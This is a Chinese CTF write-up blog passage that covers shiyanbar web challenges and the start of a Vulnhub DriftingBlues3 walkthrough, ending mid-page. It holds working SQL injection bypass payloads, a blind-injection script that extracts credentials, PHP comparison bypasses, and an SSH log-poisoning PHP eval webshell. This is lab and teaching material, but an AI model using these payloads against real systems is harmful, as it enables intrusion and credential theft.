title=\"简单的SQL注入\"></a>简单的SQL注入</h1><p>线简单测试一下 <code>id=1&#39;</code> 页面回显报错，尝试报错注入，可以得到数据库名为 <code>web1</code> ，在尝试一下过滤了那些字符没回发现过滤了许多字符 <code>from</code> , <code>where</code> ,<br><code>group_concat</code> , <code>order</code> , <code>union</code> ，这里有许多字符过滤时另加了一个空格，很恶心。</p>\n<p>最后用报错注入老是有问题，后来决定换union试一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;0&#39; uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere table_sctable_schemahema&#x3D;&#39;web1</span><br></pre></td></tr></table></figure>\n<p>可知表名<code>flag,web_1</code> ,</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;0&#39; uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere table_name&#x3D;&#39;flag</span><br></pre></td></tr></table></figure>\n<p>结果返回权限不够</p>\n<blockquote>\n<p>SELECT command denied to user ‘web1’@’localhost’ for table ‘columns’</p>\n</blockquote>\n<p>又看到题目说获取flag值，猜测列名应该是flag，</p>\n<p>最终payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;0&#39; uunion nion selselect ect flag frfrom om flag whwhere ere &#39;a&#39;&#x3D;&#39;a</span><br></pre></td></tr></table></figure>\n<h1 id=\"简单的SQL注入2\"><a href=\"#简单的SQL注入2\" class=\"headerlink\" title=\"简单的SQL注入2\"></a>简单的SQL注入2</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39;%23</span><br></pre></td></tr></table></figure>\n<p>可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/**/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;table_name&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables%23</span><br><span class=\"line\">?id&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;column_name&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;%23</span><br><span class=\"line\">?id&#x3D;-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag%23</span><br></pre></td></tr></table></figure>\n<h1 id=\"这个看起来有点简单\"><a href=\"#这个看起来有点简单\" class=\"headerlink\" title=\"这个看起来有点简单\"></a>这个看起来有点简单</h1><p>很常规的一套操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;8&#x2F;index.php?id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>\n<p>后面的省略</p>\n<h1 id=\"因缺思汀的绕过\"><a href=\"#因缺思汀的绕过\" class=\"headerlink\" title=\"因缺思汀的绕过\"></a>因缺思汀的绕过</h1><p>查看元素即可得到源码，这是基础，源码位置在 <code>source.txt</code> 。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">AttackFilter</span><span class=\"params\">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_array($StrValue))&#123;</span><br><span class=\"line\">        $StrValue=implode($StrValue);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/\"</span>.$ArrReq.<span class=\"string\">\"/is\"</span>,$StrValue)==<span class=\"number\">1</span>)&#123;   </span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"姘村彲杞借垷锛屼害鍙禌鑹囷紒\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$filter = <span class=\"string\">\"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $key=&gt;$value)&#123; </span><br><span class=\"line\">    AttackFilter($key,$value,$filter);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$con = mysql_connect(<span class=\"string\">\"XXXXXX\"</span>,<span class=\"string\">\"XXXXXX\"</span>,<span class=\"string\">\"XXXXXX\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$con)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">'Could not connect: '</span> . mysql_error());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$db=<span class=\"string\">\"XXXXXX\"</span>;</span><br><span class=\"line\">mysql_select_db($db, $con);</span><br><span class=\"line\">$sql=<span class=\"string\">\"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'\"</span>;</span><br><span class=\"line\">$query = mysql_query($sql); </span><br><span class=\"line\"><span class=\"keyword\">if</span> (mysql_num_rows($query) == <span class=\"number\">1</span>) &#123; </span><br><span class=\"line\">    $key = mysql_fetch_array($query);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($key[<span class=\"string\">'pwd'</span>] == $_POST[<span class=\"string\">'pwd'</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"CTF&#123;XXXXXX&#125;\"</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"浜﹀彲璧涜墖锛�\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"涓€棰楄禌鑹囷紒\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">mysql_close($con);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关键代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class=\"line\">$query &#x3D; mysql_query($sql); </span><br><span class=\"line\">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class=\"line\">    $key &#x3D; mysql_fetch_array($query);</span><br><span class=\"line\">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class=\"line\">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from users where username&#x3D;&#39;&#39; or 1&#x3D;1 limit 1 offset 0</span><br></pre></td></tr></table></figure>\n<p>但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname&#x3D;uname&#x3D;&#39; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2#&amp;pwd&#x3D;</span><br></pre></td></tr></table></figure>\n<p>这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。</p>\n<p>注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值</p>\n<blockquote>\n<p>Variable_name | Value<br>sql_mode       | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER</p>\n</blockquote>\n<p>默认会设置有 <font face=\"futura\">ONLY_FULL_GROUP_BY</font>这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set GLOBAL sql_mode&#x3D;&#39;TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER&#39;</span><br></pre></td></tr></table></figure>\n<p>如此即可以在自己的数据库上实现相同的效果。</p>\n<h1 id=\"天网管理系统\"><a href=\"#天网管理系统\" class=\"headerlink\" title=\"天网管理系统\"></a>天网管理系统</h1><p>查看元素，发现语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$test&#x3D;$_GET[&#39;username&#39;]; $test&#x3D;md5($test); if($test&#x3D;&#x3D;&#39;0&#39;)</span><br></pre></td></tr></table></figure>\n<p>可知是利用md5弱比较，</p>\n<p>故提交username为 <code>s878926199a</code> ,即可得到下一个页面地址，得到如下语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$unserialize_str &#x3D; $_POST[&#39;password&#39;]; </span><br><span class=\"line\">$data_unserialize &#x3D; unserialize($unserialize_str); </span><br><span class=\"line\">if($data_unserialize[&#39;user&#39;] &#x3D;&#x3D; &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;]&#x3D;&#x3D;&#39;???&#39;) &#123; </span><br><span class=\"line\">\tprint_r($flag); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure>\n<p>看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a[&#39;user&#39;] &#x3D; true;</span><br><span class=\"line\">$a[&#39;pass&#39;] &#x3D; true;</span><br><span class=\"line\">$b &#x3D; serialize($a);</span><br><span class=\"line\">print($b);</span><br></pre></td></tr></table></figure>\n<p>提交就可以了。</p>\n<h1 id=\"拐弯抹角\"><a href=\"#拐弯抹角\" class=\"headerlink\" title=\"拐弯抹角\"></a>拐弯抹角</h1><p>代码审计，就是绕过的题目的过来吧就好了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;indirection\\index.php&#x2F;index.php</span><br></pre></td></tr></table></figure>\n<p>关键点就是还是利用\\来替换/，尽管题目限制了\\，但是在此处并没有受到限制</p>\n<h1 id=\"Forms\"><a href=\"#Forms\" class=\"headerlink\" title=\"Forms\"></a>Forms</h1><p>查看元素，发现一段代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;input name&#x3D;&quot;showsource&quot; value&#x3D;&quot;0&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>直接修改值为1即可查看源代码，然后一波简单操作就得到flag</p>\n<h1 id=\"忘记密码了\"><a href=\"#忘记密码了\" class=\"headerlink\" title=\"忘记密码了\"></a>忘记密码了</h1><p>先随便输入个邮箱之后页面会返回跳转链接 <code>step2.php?email=youmail@mail.com&amp;check=???????</code> ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;form action&#x3D;&quot;submit.php&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class=\"line\">\t\t&lt;h1&gt;æ¾åå¯ç step2&lt;&#x2F;h1&gt;</span><br><span class=\"line\">\t\temail:&lt;input name&#x3D;&quot;emailAddress&quot; type&#x3D;&quot;text&quot; &lt;br &#x2F;&gt;</span><br><span class=\"line\">\t\tvalue&#x3D;&quot;youmail@mail.com&quot;  disable&#x3D;&quot;true&quot;&#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class=\"line\">\t\ttoken:&lt;input name&#x3D;&quot;token&quot; type&#x3D;&quot;text&quot; &#x2F;&gt;&lt;&#x2F;br&gt;</span><br><span class=\"line\">\t\t&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>\n<p>访问submit.php页面，提示不是admin，在查看抓包内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;meta name&#x3D;&quot;admin&quot; content&#x3D;&quot;admin@simplexue.com&quot; &#x2F;&gt;</span><br><span class=\"line\">&lt;meta name&#x3D;&quot;editor&quot; content&#x3D;&quot;Vim&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>\n<p>发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(strlen($token)!=<span class=\"number\">10</span>) <span class=\"keyword\">die</span>(<span class=\"string\">'fail'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($token!=<span class=\"string\">'0'</span>) <span class=\"keyword\">die</span>(<span class=\"string\">'fail'</span>);</span><br></pre></td></tr></table></figure>\n<p>这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 <code>content=&quot;admin@simplexue.com&quot;</code> 猜测可能就是admin邮箱，提交一下果然可以</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;10&#x2F;upload&#x2F;submit.php?emailAddress&#x3D;admin@simplexue.com&amp;token&#x3D;0e00000000</span><br></pre></td></tr></table></figure>\n<h1 id=\"once-more\"><a href=\"#once-more\" class=\"headerlink\" title=\"once more\"></a>once more</h1><p>很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1e8%00*-*</span><br></pre></td></tr></table></figure>\n<h1 id=\"Guess-next-session\"><a href=\"#Guess-next-session\" class=\"headerlink\" title=\"Guess next session\"></a>Guess next session</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start(); </span><br><span class=\"line\">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class=\"line\">    if ($_GET[&#39;password&#39;] &#x3D;&#x3D; $_SESSION[&#39;password&#39;])</span><br><span class=\"line\">        die (&#39;Flag: &#39;.$flag);</span><br><span class=\"line\">    else</span><br><span class=\"line\">        print &#39;&lt;p&gt;Wrong guess.&lt;&#x2F;p&gt;&#39;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 <code>$_SESSION[&#39;password&#39;]</code> 为空，那么我们提交一个空的密码那么在验证时就会有 <code>&#39;&#39;==&#39;&#39;</code> 为true，即可验证通过</p>\n<h1 id=\"FALSE\"><a href=\"#FALSE\" class=\"headerlink\" title=\"FALSE\"></a>FALSE</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'name'</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>sha1数组绕过即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?name[]&#x3D;2&amp;password[]&#x3D;1</span><br></pre></td></tr></table></figure>\n<h1 id=\"程序逻辑问题\"><a href=\"#程序逻辑问题\" class=\"headerlink\" title=\"程序逻辑问题\"></a>程序逻辑问题</h1><p>查看元素可以看到有个 <code>index.txt</code> ，访问以下得到源码，这里只给出部分</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class=\"line\">\t$conn = mysql_connect(<span class=\"string\">\"********\"</span>, <span class=\"string\">\"*****\"</span>, <span class=\"string\">\"********\"</span>);</span><br><span class=\"line\">\tmysql_select_db(<span class=\"string\">\"phpformysql\"</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"Could not select database\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">\"Connection failed: \"</span> . mysql_error($conn));</span><br><span class=\"line\">&#125; </span><br><span class=\"line\">$user = $_POST[user];</span><br><span class=\"line\">$pass = md5($_POST[pass]);</span><br><span class=\"line\"></span><br><span class=\"line\">$sql = <span class=\"string\">\"select pw from php where user='$user'\"</span>;</span><br><span class=\"line\">$query = mysql_query($sql);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$query) &#123;</span><br><span class=\"line\">\tprintf(<span class=\"string\">\"Error: %s\\n\"</span>, mysql_error($conn));</span><br><span class=\"line\">\t<span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class=\"line\"><span class=\"comment\">//echo $row[\"pw\"];</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#39; and 0&#x3D;1 union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39;#</span><br></pre></td></tr></table></figure>\n<p>那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">user&#x3D;&#39; and 0&#x3D;1 union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pass&#x3D;1</span><br></pre></td></tr></table></figure>\n<h1 id=\"PHP大法\"><a href=\"#PHP大法\" class=\"headerlink\" title=\"PHP大法\"></a>PHP大法</h1><p>url二次编码绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;%2568%2561%2563%256b%2565%2572%2544%254a</span><br></pre></td></tr></table></figure>\n<h1 id=\"貌似有点难\"><a href=\"#貌似有点难\" class=\"headerlink\" title=\"貌似有点难\"></a>貌似有点难</h1><p>简单的x-forwarded-for修改即可</p>\n<h1 id=\"看起来有点难\"><a href=\"#看起来有点难\" class=\"headerlink\" title=\"看起来有点难\"></a>看起来有点难</h1><p>先是随便在admin字段尝试（因为admin字段有回显），当输入 <code>admin&#39; and 1=1#</code> 时返回“登录失败，错误的用户名和密码”，而如果输入 <code>admin&#39; and 1=2#</code> 时，则返回“数据库连接错误”！！，所以这儿是一处注入点</p>\n<p>判断数据库长度 <code>admin&#39; and length(database())=4#</code> 可知数据库长度为4，接下来爆库名 <code>?admin=admin&#39; and substr(database(),1,3)=&#39;tes&#39;%23&amp;pass=12456&amp;action=login</code> ,数据库名是 <code>test</code> </p>\n<p>盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and \"</span></span><br><span class=\"line\">dic = <span class=\"string\">',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'</span></span><br><span class=\"line\"><span class=\"comment\"># payload = \"substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"</span></span><br><span class=\"line\">yes = <span class=\"string\">'错误'</span></span><br><span class=\"line\">length = <span class=\"number\">1</span></span><br><span class=\"line\">table_name = <span class=\"string\">''</span>  <span class=\"comment\"># admin</span></span><br><span class=\"line\">column_name = <span class=\"string\">''</span> <span class=\"comment\"># username,password</span></span><br><span class=\"line\"><span class=\"comment\"># payload = \"substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"</span></span><br><span class=\"line\">payload = <span class=\"string\">\"substr((Select group_concat(username,password) from admin),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login\"</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"literal\">True</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">\t\tres = requests.get(url + payload.format(str(length),i)).text.encode(<span class=\"string\">'latin-1'</span>).decode(<span class=\"string\">'gb2312'</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> yes <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># table_name += i</span></span><br><span class=\"line\">\t\t\tcolumn_name += i</span><br><span class=\"line\">\t\t\tlength += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tprint(column_name)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i == <span class=\"string\">'@'</span>:</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">'aaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class=\"line\"><span class=\"comment\"># admin,idnuenna</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"猫抓老鼠\"><a href=\"#猫抓老鼠\" class=\"headerlink\" title=\"猫抓老鼠\"></a>猫抓老鼠</h1><p>脑洞题，注意题目响应头 <code>Content-Row: MTUyODYyMjkxMQ==</code> 直接把这个内容提交验证即可。。</p>\n<h1 id=\"头有点大\"><a href=\"#头有点大\" class=\"headerlink\" title=\"头有点大\"></a>头有点大</h1><p>打开后看到有如下要求</p>\n<blockquote>\n<p>You don’t have permission to access / on this server.<br>Please make sure you have installed .net framework 9.9!<br>Make sure you are in the region of England and browsing this site with Internet Explorer</p>\n</blockquote>\n<p>第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; Trident&#x2F;7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0) like Geckog</span><br></pre></td></tr></table></figure>\n<p>第三个要求来自英国，可以通过修改accept-language字段的值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">en-gb;q&#x3D;0.8</span><br></pre></td></tr></table></figure>\n","categories":["writeup"],"tags":["CTF"]},{"title":"Vulnhub系列-Draftingblues3","url":"/2021/06/03/vulnhubDraftingblues3/","content":"<p><img src=\"/2021/06/03/vulnhubDraftingblues3/2.png\" alt></p>\n<a id=\"more\"></a>\n<p>扫描端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.110</span><br></pre></td></tr></table></figure>\n<p>开放80和22端口</p>\n<p>80端口访问robots.txt可以得到路径提示，访问<code>/eventadmins</code>路径，得到提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">man there&#39;s a problem with ssh</span><br><span class=\"line\"></span><br><span class=\"line\">john said &quot;it&#39;s poisonous!!! stay away!!!&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">idk if he&#39;s mentally challenged</span><br><span class=\"line\"></span><br><span class=\"line\">please find and fix it</span><br><span class=\"line\"></span><br><span class=\"line\">also check &#x2F;littlequeenofspades.html</span><br><span class=\"line\"></span><br><span class=\"line\">your buddy, buddyG</span><br></pre></td></tr></table></figure>\n<p>可以看到还有一个页面<code>/littlequeenofspades.html</code>，访问该页面，然后此时需要开脑洞查看一下源代码，可以看到一段base64</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;draftingblue3]</span><br><span class=\"line\">└─$ echo &#39;aW50cnVkZXI&#x2F;IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ&#x3D;&#x3D;&#39;|base64 -d</span><br><span class=\"line\">intruder? L2FkbWluc2ZpeGl0LnBocA&#x3D;&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;draftingblue3]</span><br><span class=\"line\">└─$ echo &#39;L2FkbWluc2ZpeGl0LnBocA&#x3D;&#x3D;&#39;|base64 -d</span><br><span class=\"line\">&#x2F;adminsfixit.php</span><br></pre></td></tr></table></figure>\n<p>访问/adminsfixit.php页面，该页面会记录登录记录，所以我们可以通过登录名来构造php木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh &#39;&lt;?php @eval($_POST[123]);?&gt;&#39;@192.168.56.110</span><br></pre></td></tr></table></figure>\n<p>然后蚁剑连接即可，发现robertj用户.ssh非属主用户可读可写可执行，所以上传公钥到服务器然后即可登录</p>\n<p><img src=\"/2021/06/03/vulnhubDraftingblues3/1.png\" alt></p>\n<p>登录之后查看user.txt可以得到第一段flag</p>\n<p>查看id可以发现该用户存在一个奇怪的用户组operators</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">robertj@driftingblues:&#x2F;tmp$ id</span><br><span class=\"line\">uid&#x3D;1000(robertj) gid&#x3D;1000(robertj) groups&#x3D;1000(robertj),1001(operators)</span><br><span class=\"line\">robertj@driftingblues:&#x2F;tmp$ ls -l &#x2F;usr&#x2F;bin&#x2F;getinfo</span><br><span class=\"line\">-r-sr-s--- 1 root operators 16704 Jan  4 11:05 &#x2F;usr&#x2F;bin&#x2F;getinfo</span><br></pre></td></tr></table></figure>\n<p>查看属于该用户组的suid权限的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 